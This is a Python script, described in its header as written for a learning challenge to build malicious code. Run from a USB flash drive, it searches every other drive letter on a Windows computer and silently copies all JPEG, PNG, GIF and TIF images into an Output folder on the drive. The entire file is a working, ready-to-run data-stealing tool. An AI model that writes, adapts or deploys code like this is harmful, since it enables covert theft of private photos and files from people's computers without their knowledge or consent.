
# File: Main.py
#
# @Author: Victor Dalosto
# @Date:   2022-31-03
# @Email:  victordalosto@gmail.com
# Description: This script was developed for a learning challenge,
#              where we had to develop an malicious code.
#  I developed an executable script that would be used in a flash disk that
#  once executed, would find all the images that it finds in the computer and
#  copy it into the flash disk Output folder.

import os
import shutil

# Defines the HDs storage path that will be used to search for images.
HDS = ["C:/", "D:/", "E:/", "F:/", "G:/", "A:/", "B:/", "H:/", "I:/", "J:/"]

# Gets the current storage folder. Generally used in a flash disk.
currentHD = os.path.abspath(os.sep)

# Create a folder to store all the images.
pathOutput = os.path.join(os.getcwd(), "Output")
if os.path.isdir(pathOutput) is False:
    os.mkdir(pathOutput)

# A loop that walks and pings all the HDS storages
# and copies all files images into the pathOutput directory.
for HD in HDS:  # Loop for each HD in HDS array
    if HD != currentHD.replace("\\", "/"):  # Avoid checking current directory
        for rt, d, files in os.walk(HD):  # Generate files in a directory tree
            for img in files:  # Check if file is an image
                if img.lower().endswith(".jpeg") or \
                   img.lower().endswith(".jpg") or \
                   img.lower().endswith(".png") or \
                   img.lower().endswith(".gif") or \
                   img.lower().endswith(".tif"):
                    shutil.copy(os.path.join(rt, img), pathOutput)  # Copy img
